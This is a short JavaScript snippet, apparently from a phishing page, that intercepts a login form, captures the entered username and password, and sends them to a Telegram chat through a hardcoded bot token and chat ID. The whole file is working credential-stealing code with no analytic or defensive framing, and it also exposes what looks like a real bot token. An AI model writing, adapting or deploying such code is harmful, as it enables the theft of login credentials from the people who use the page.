document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const username = document.getElementById('username').value || 'No Username';
    const password = document.getElementById('password').value || 'No Password';
    const message = `🔐 Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`;
    sendToTelegram(message);
});

function sendToTelegram(message) {
    const token = '6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs';
    const chatId = '1046458749';
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: chatId, text: message})
    });
}